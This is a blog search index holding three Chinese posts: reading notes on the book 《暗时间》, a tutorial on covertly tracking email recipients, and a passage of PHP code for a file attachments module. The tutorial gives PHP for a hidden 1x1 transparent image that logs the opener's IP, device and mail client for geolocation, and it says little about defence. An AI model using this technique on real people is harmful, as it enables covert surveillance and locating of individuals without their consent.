<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>《暗时间》读书笔记</title>
      <link href="/2018/10/26/reading-notes-of-dark-time/"/>
      <url>/2018/10/26/reading-notes-of-dark-time/</url>
      <content type="html"><![CDATA[<p>应老师要求，拜读了《暗时间》，因为个人原因，找的是网上的PDF，看完以后，觉得这本书可以作为实体收藏，待生活安顿以后好好收藏起来，给自己的子女看看也是不错的。《暗时间》这本书，起初不知道是什么内容的书，从书名 <code>drak time</code> 也算勾起了我对这本书的一个兴趣，看封面简介的时候，以为是一本心理学的书记，看到最后，我认为这是一本教人思考的书籍，全书电子版 <code>269</code> 页，花了大概5个小时看完了，除了最后面的思考部分需要动一下脑子才能理解 <code>Y Combinator</code> 和 <code>哥德尔的不完备性定理</code> 等其他理论性的东西， 其他的很少动脑子，被动接受了书中的说法，与其说这是读书笔记不如说是读书心得吧，书中的好的想法整理了以下，大概记录了7页的 <code>Word</code> 文档，其中很多都感觉让人收益良多。</p><a id="more"></a><p>书的作者具体详情不熟，但从其文风来看，大佬是跑不了的，从书中的记录来看，应该在微软，近期也不知道如何，获取我也不会关注太多，书中提到：</p><blockquote><p>书写是为了更好的思考</p></blockquote><p>这个我是感触很深的，从最开始2014年写教程开始，也算每年都有一些技术分享或者是博文记录了自己的一些心得，但是也不是每个月都有文章，我也是比较忙或者比较懒的一类吧，但是每次写文章的时候，感觉自己的思维都调动了起来，写教程的时候，我想着如何将一个操作尽量完美的解释给读者，虽然教程的结构是书中最不提倡的 <code>瀑布式</code> 的结构，将结论一步一步的写出来，直接给读者以答案，但是作为一个教程，在互联网的时代，感觉有深度思考的都会被拚弃，就像暗时间后面的部分，我也是压着性子跟着书中的文字思考了相关的问题，也算是很难受。我们可能要给自己的就是我们的一个思考时间吧，书中提到：</p><blockquote><p>为什么你要冲现在开始就要写博客？</p><blockquote><p>一开始你是因为要写博客而去使劲的思考和总结，指望给出令人眼前一亮的东西，而到后来，就变成了你习惯了思考和总结。</p></blockquote></blockquote><p>博客确实是一个思考和终结的集合体，从最开始的时候写教程到后面写博客，我也是一步一步的思考终结在下笔，但是也算是一些简单的技术博客吧，从16年开始我也打算自建自己的博客系统，但是由于时间等问题，我的博客系统也没有提上日程，也就是上个月，勉强完成了一个组件，博客系统的简单编辑器，现在的博客也是用的 <code>Hexo</code> 做我的博客，后续的化，可能会弄一个导入的方式，将 <code>Hexo</code> 的博客导入到我自己的博客系统中吧，感觉今年我的博客系统大概能出世了，从框架，到编辑器都自己造轮子般的写了以下，估计后续很少有时间和经历来这样花费了吧，不过后续我也会挤时间做一些自己的事情的。</p><p>书中提到了 <code>表意识</code> 和 <code>潜意识</code> 还有各种大脑的运作以及其相关现象，感觉上将大佬的情绪处理以及思维方式还有逻辑方式一点点的揭露在我的面前，让我自己思考了以下我思考这个动作所产生的各种生理或者心理的动作，想到了以前的各种事物，好像一切如书中所说，思考的结果就是我们自己的脑海里冒出来的一个被表意识捕捉到的一个泡沫吧。</p><blockquote><p>如果你有些钱不知道花在A上还是B上，你不做决定，没问题，钱还是你的，如果你有些时间不知道花在A上还是B上，你不做决定，不行，过了这段时间，时间就不是你的。</p></blockquote><p>也不算摘录吧，这篇笔记是按照回忆写的，因为没有实体书，很多东西不方便去翻，但是也有做截图，但是截图都是截了自己觉得有趣的部分，在时间问题上，我们一直说 <strong>时间对待我们每个人都是公平的</strong> 但是书中给了我们一个很明确的观点 ： <strong>时间就像沙漏里的沙，你就是这个沙漏，你的口小，那么你留住时间的时间就越长</strong> 我们每个人都在这个宇宙中活着，每个人的时间都是一致的，像是上面，时间过了就是过了，你的时间并不会为你的犹豫添加或者减少，所以我们做决定的时候也当是果断。能抓住的时间才是时间。</p><blockquote><p>你的付出 =  投入的时间 * 你的效率</p></blockquote><p>有时候，我们在想，我们明明投入了那么多时间，为什么一件事还是做不好？书中给我们解说到：<strong>你所投入的，其实是你投入的时间与你的效率的乘积</strong> 所以，所谓的事倍功半或者事半功倍大抵是如此吧。不过即使效率低，投入了才是投入，如果你根本不投入，那么，事情也永远完成不了。</p><blockquote><p>遇见20万年前的自己</p></blockquote><p>其实看到这个的时候我在想我怎么会遇上20万年前的自己？自己到现在也不过堪堪在这世界上存活了20多个年头罢了，但是书中为我解释了这个说明，我也接受了这个说明，我们的大脑还是处在20多万年进化不断更新的状态，跟不上我们21世纪的科技，也就是我们的思维的差异吧，我们个人的思维潜意识中还停留在非法制社会的时代，所有的一切都是为了我们个体的更好的繁衍，保持自己的群体优势吸引异性、吃高热量的食物等等基础行为都是硬编码在我们自己的基因中的，而且我们做出的很多决定都是不在我们理性思维的思考中的，有时候就下意识的做出了千万年来我们在我们基因中的正确的决定而不是基于当前社会做出正确的决议。</p><blockquote><p> 有的人偏向于用直觉进行决策，有些人偏向于理性分析，而事实上这两者不能没有孰优孰劣之分，只是在不同的场合适用。无法驾驭这两种决策引擎的人要么一方压倒另一方，要么就是陷入纠结。</p></blockquote><p>我们学习的目的，就是为了能够驾驭号我们自己的决策引擎，用 <strong>知识</strong> 来给自己的决策价码，做出适合自己的决策行为。</p><blockquote><p>在远古社会，我们在向姑娘求爱时候会小心谨慎，因为一次洋相会很快传递开来从而使我们变成整个群落的笑柄，然而在现代社会，尤其是人口流动剧烈，人际关系变动频繁的大城市，社交失败的成本近乎与零，所以正确而理性的做法确是勇敢的迈出第一步</p></blockquote><p>虽然文中给与了我一个很正常的恋爱思路，但是我还是在思考一个问题：<strong>没有时间陪另一半的时候也没必要找另一半</strong>，这或许是一个极端想法，但是也是最符合我当前状况的一种情况：<strong>各种事务繁杂，没有什么空余时间</strong>，也有一句话：<strong>你想以最完美的姿态出现在另一半面前，但是这似乎是永远不可能准备好的</strong> 。在整个大学，我近乎没有恋过爱，有几个关系很不错的姑娘，也始终没有迈出一步，这似乎就是随缘吧。</p><blockquote><p>我们知道答案，却往往不知道求解的正真思维过程。</p></blockquote><p>在现今的社会，我们对于结果的追求往往优于高过对过程的追求，以至于我们很少去思考，或许是这个快节奏的社会的影响吧。</p><blockquote><p>只要一种解释对自己是有利的，我们便不想去推敲和反驳，再漏洞百出的事情看上去也不无可能，而且只要有一种解释是可能的，我们就认定其一定是的，而对自己不利的解释，我们或者忽略，或者会异常仔细的去推敲，抓住一个细小漏洞，相信自己完全推翻了该解释</p></blockquote><p>感觉这是对我们性格的诠释，书中也从各种方面分析了其内涵和原理，为了避免决策事物，我们能改变我们自己固有习惯的，<strong>依靠的不是自制力，而是知识</strong> 而知识的学习，我们也可以用 GTD 的原理来学习： </p><blockquote><p>通过不断的进展，让执行者意识到事情正在朝向完成不断麦精，正是这种正面趋势所带来的积极感情能够进一步激励个体把事情执行到底</p></blockquote><p>正如我看这本书一样，由于时间很紧张，我抽出了一个下午的时间来看这一本两百多页的书籍，几个小时的时间我也是慢慢的通过给自己进度条来将这本书看到底的。</p><blockquote><p>如果觉得做不下去了，就硬着头皮坚持做，然后就类似于麻木了，适应了，那种望而却步的感觉会逐渐自动褪去。</p></blockquote><p>其实说来也是，我的一本 <code>Python</code> 游戏编程的书籍，翻译了不到一节就结束了，对于英文文献的阅读我还是不太习惯，或许我应该慢慢的坚持下去。</p><blockquote><p>困难只不过是生活的状态，而一步一步跨越障碍则是最简单最正常的方法</p></blockquote><p>我突然想继续开始我的翻译之旅。</p><blockquote><p>“三天打鱼，两天晒网” 的人往往到最后会变 “ 整天晒网，永不打鱼”。</p></blockquote><p>一本再厚的书，只要每天翻译一点，总有翻译完的一天，而且完全可以算出来需要用多久就能翻译完，而反正则永远没有开始的那一天。</p><blockquote><p>我们对于未来的惩罚和收益都估计不足，倾向于眼下的损益进行决策</p></blockquote><p>这导致了我们天生在决策方面目光短浅，一个典型就是我们在大学的时候发挥大量时间去娱乐而不是学习，这些娱乐都有一个典型的特征，就是能够立刻获得愉悦，而且并不会导致立即的损失。毕业看似遥遥无期，我们很难艰难提前几年就设想几年后的危机，毕竟未来的事情谁说得清呢？而事实上我们能够看远几年，近乎就能领先别人几年。</p><p>这本书近乎是我看过的相关书籍里面给我思考最深的书籍，也谢谢老师推荐这样一本书籍给我来看，近几年感觉自己的书籍阅读量下去了，整天就是在工作，或许工作之余可以多阅读基本书籍，或专业方面，或思维方面，总能给自己一些新的感受。</p>]]></content>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>通过邮箱偷IP定位的正确姿势</title>
      <link href="/2018/10/02/email-owned-your-ip/"/>
      <url>/2018/10/02/email-owned-your-ip/</url>
      <content type="html"><![CDATA[<blockquote><p><strong>本文针对用户群体为不使用代理查看邮件的用户</strong></p></blockquote><p>还记得那些年，邮箱钓鱼盛行，各种广告邮件钓鱼邮件层出不穷（现在还有某阿X的开发票推送），经过邮箱防水墙能拦截一部分以外，你是否注意到了正常邮箱可能被有心人利用的姿势？</p><a id="more"></a><h2 id="真·检测邮箱是否已读"><a href="#真·检测邮箱是否已读" class="headerlink" title="真·检测邮箱是否已读"></a>真·检测邮箱是否已读</h2><p>某天，工作的时候发送了一封邮件给一个比较重要的人，左等右等，心里在想，TA看了我的邮箱没有？现在通过一个姿势来获取一下自己邮箱的已读状态吧？</p><p><strong>原理</strong> 邮件被打开后很大几率会直接加载邮件中的图片</p><p>首先，准备一台服务器，服务器的权限最好是自己有，使用一下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">'Content-Type:image/png'</span>);</span><br><span class="line">$im = imagecreatetruecolor (<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">$background_color = imagecolorallocatealpha($im, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">127</span>);</span><br><span class="line">imagepng($im);</span><br><span class="line">imagedestroy($im);</span><br></pre></td></tr></table></figure><p>以上代码创建了一个1x1大小的全透明的图片（<strong>谁都看不到哦</strong>），我们把这个图片放到我们自己的服务器上，访问可以看到一张啥都没有的图片：</p><p><img src="1.png" alt=""></p><p>光是生成图片还不够，我们记录一下 <code>$_SERVER[&#39;HTTP_REFERER&#39;]</code> 和 <code>$_SERVER[&#39;HTTP_USER_AGENT&#39;]</code> 这俩个存储了用户从哪里来，使用了什么用户代理（浏览器设备）过来的，最后还有 <code>ip</code>，我们通过如下代码获取：</p><blockquote><p>参考：<a href="https://github.com/DXkite/suda/blob/master/system/src/suda/core/Request.php#L211" target="_blank" rel="noopener">https://github.com/DXkite/suda/blob/master/system/src/suda/core/Request.php#L211</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $ipFrom = [<span class="string">'HTTP_CLIENT_IP'</span>,<span class="string">'HTTP_X_FORWARDED_FOR'</span>,<span class="string">'HTTP_X_FORWARDED'</span>, <span class="string">'HTTP_X_CLUSTER_CLIENT_IP'</span>,<span class="string">'HTTP_FORWARDED_FOR'</span>,<span class="string">'HTTP_FORWARDED'</span>,<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($ipFrom <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists($key, $_SERVER)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (explode(<span class="string">','</span>, $_SERVER[$key]) <span class="keyword">as</span> $ip) &#123;</span><br><span class="line">                $ip = trim($ip);</span><br><span class="line">                <span class="keyword">if</span> ((bool) filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> $ip;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  <span class="string">'127.0.0.1'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取完以上数据后，写入到数据库中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ip = get_ip();</span><br><span class="line">$from = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$client = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line"><span class="comment">// SQL 插入到数据库中</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>写完以后，我们在邮件中插入我们的图片（使用URL插入），对方收到后可能是这样的：</p><p><img src="2.png" alt=""></p><p>对方打开后，那么数据库中：</p><p><img src="3.png" alt=""></p><p>可以看到对方的信息：</p><table><thead><tr><th>字段</th><th>信息内容</th><th>解释</th></tr></thead><tbody><tr><td>HTTP_USER_AGENT</td><td>Mozilla/5.0 (Linux; Android 8.0.0; MIX 2S Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36</td><td>从头部分析，可以看到用户通过小米Mix 2S打开的邮件</td></tr><tr><td>HTTP_REFERER</td><td><a href="http://netease-default-url-start/" target="_blank" rel="noopener">http://netease-default-url-start/</a></td><td>从来源可以看出，用户通过网易客户端打开邮件</td></tr><tr><td>IP</td><td>117.136.*.*</td><td>打开时，用户使用的出网IP</td></tr></tbody></table><h2 id="通过IP定位"><a href="#通过IP定位" class="headerlink" title="通过IP定位"></a>通过IP定位</h2><blockquote><p>这个自己找IP定位设备的网站吧</p></blockquote><p><img src="4.png" alt=""></p><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>不是每个人上网都带跳板的，所以很容易定位到对应的地址，手机还好，如果是通过电信啥的上网，地理位置很容易就定位了。</p>]]></content>
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 19 通用附件模块</title>
      <link href="/2018/08/28/suda-attachments/"/>
      <url>/2018/08/28/suda-attachments/</url>
      <content type="html"><![CDATA[<p>一个表白墙的功能原本上是不需要附件的功能的，但是在markdown里面的图片和资源也可以算作附件。</p><a id="more"></a><p>为了能够通用化，还是对表段进行了一次通用的处理，在此之前还得更新下框架，刚刚调整了解析表达式的功能。</p><h2 id="通用的表"><a href="#通用的表" class="headerlink" title="通用的表"></a>通用的表</h2><p>这里我们创建一个表，接受一个 <code>Command</code> 表达式描述的类作为参数，通过方法 <code>Command::newClassInstance</code> 实例化一个类描述。</p><p>类描述的一般形式 <code>&quot;name.space.for.ClassName&quot;</code> 还可以带简单参数：<code>&quot;name.space.for.ClassName(params)&quot;</code></p><p>现在我们创建一个表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">attachments</span>\<span class="title">table</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">suda</span>\<span class="title">tool</span>\<span class="title">Command</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">suda</span>\<span class="title">archive</span>\<span class="title">Table</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 附件表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AttachmentTable</span> <span class="keyword">extends</span> <span class="title">Table</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $target=null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 实例化一个字符串到类</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = Command::newClassInstance($target);</span><br><span class="line">        $perfix = <span class="keyword">self</span>::parsePerfix(<span class="keyword">$this</span>-&gt;target-&gt;getTableName());</span><br><span class="line">        <span class="keyword">parent</span>::__construct($perfix.<span class="string">'attachments'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTargetTable</span><span class="params">()</span>:<span class="title">Table</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parsePerfix</span><span class="params">(?string $fix)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_null($fix)) &#123;</span><br><span class="line">            $fix = $fix.<span class="string">'_'</span>;</span><br><span class="line">            <span class="keyword">return</span> ltrim(preg_replace(<span class="string">'/[^\w]+/'</span>, <span class="string">'_'</span>, $fix), <span class="string">'_'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onBuildCreator</span><span class="params">($table)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $table-&gt;fields(</span><br><span class="line">            $table-&gt;field(<span class="string">'id'</span>, <span class="string">'bigint'</span>, <span class="number">20</span>)-&gt;primary()-&gt;unsigned()-&gt;auto(),</span><br><span class="line">            $table-&gt;field(<span class="string">'target'</span>, <span class="string">'bigint'</span>, <span class="number">20</span>)-&gt;unsigned()-&gt;comment(<span class="string">'目标内容'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'attachment'</span>, <span class="string">'bigint'</span>, <span class="number">20</span>)-&gt;unsigned()-&gt;comment(<span class="string">'附件ID'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'hash'</span>, <span class="string">'varchar'</span>, <span class="number">32</span>)-&gt;comment(<span class="string">'附件Hash'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'time'</span>, <span class="string">'int'</span>, <span class="number">11</span>)-&gt;key()-&gt;unsigned()-&gt;comment(<span class="string">'添加时间'</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h2><p>这里提供了三个功能，对附件的添加删除和修改，其中添加的话只能当前用户添加到自己的表白（target）里面去，<br>这里还使用了一个类 <code>dxkite\support\file\Media</code> 用于将文件类 <code>dxkite\support\file\File</code> 存储到数据库中。<br>文件类的话这里是由Support模块维护，可以接受一个Form表单提供的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">attachments</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">suda</span>\<span class="title">core</span>\<span class="title">Query</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">suda</span>\<span class="title">exception</span>\<span class="title">SQLException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">support</span>\<span class="title">file</span>\<span class="title">File</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">support</span>\<span class="title">file</span>\<span class="title">Media</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">attachments</span>\<span class="title">table</span>\<span class="title">AttachmentTable</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 附件控制器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AttachmentController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $table;</span><br><span class="line">    <span class="keyword">protected</span> $target;</span><br><span class="line">    <span class="keyword">protected</span> $userField;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $target, string $userField = <span class="string">'user'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;table=<span class="keyword">new</span> AttachmentTable($target);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = <span class="keyword">$this</span>-&gt;table-&gt;getTargetTable();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userField = $userField;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(int $target, File $attachment)</span>:<span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($targetData = <span class="keyword">$this</span>-&gt;target-&gt;getByPrimaryKey($target)) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($targetData[<span class="keyword">$this</span>-&gt;userField] == get_user_id()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;table-&gt;select(<span class="string">'*'</span>, [<span class="string">'hash'</span>=&gt;$attachment-&gt;getMd5(),<span class="string">'target'</span>=&gt;$target])-&gt;fetch()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $file = Media::save($attachment);</span><br><span class="line">                    <span class="keyword">if</span> (!$file) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;table-&gt;insert([</span><br><span class="line">                        <span class="string">'time'</span>=&gt;time(),</span><br><span class="line">                        <span class="string">'target'</span>=&gt; $target,</span><br><span class="line">                        <span class="string">'attachment'</span> =&gt; $file-&gt;getId(),</span><br><span class="line">                        <span class="string">'hash'</span> =&gt; $attachment-&gt;getMd5(),</span><br><span class="line">                    ]) &gt; <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttachments</span><span class="params">(int $target)</span>:?<span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($images = <span class="keyword">$this</span>-&gt;table-&gt;select(<span class="string">'*'</span>, [<span class="string">'target'</span>=&gt;$target])-&gt;fetchAll()) &#123;</span><br><span class="line">            <span class="keyword">return</span> $images;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span><span class="params">(int $attachmentId)</span>:<span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($fetchData = <span class="keyword">$this</span>-&gt;table-&gt;select([<span class="string">'attachment'</span>,<span class="string">'target'</span>], [<span class="string">'id'</span>=&gt;$attachmentId])-&gt;fetch()) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="string">'target'</span>=&gt;$target,<span class="string">'attachment'</span> =&gt; $attachment) = $fetchData;</span><br><span class="line">            <span class="keyword">if</span> ($targetData = <span class="keyword">$this</span>-&gt;target-&gt;getByPrimaryKey($target)) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($targetData[<span class="keyword">$this</span>-&gt;userField] == get_user_id()) &#123;</span><br><span class="line">                    Media::delete($attachment);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;table-&gt;delete([<span class="string">'id'</span>=&gt;$attachmentId]) &gt; <span class="number">0</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Provider-的实现"><a href="#Provider-的实现" class="headerlink" title="Provider 的实现"></a>Provider 的实现</h2><p>由于没有什么东西，就暂时先把 <code>Controller</code> 映射出去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">attachments</span>\<span class="title">provider</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">attachments</span>\<span class="title">controller</span>\<span class="title">AttachmentController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">support</span>\<span class="title">file</span>\<span class="title">File</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 附件</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 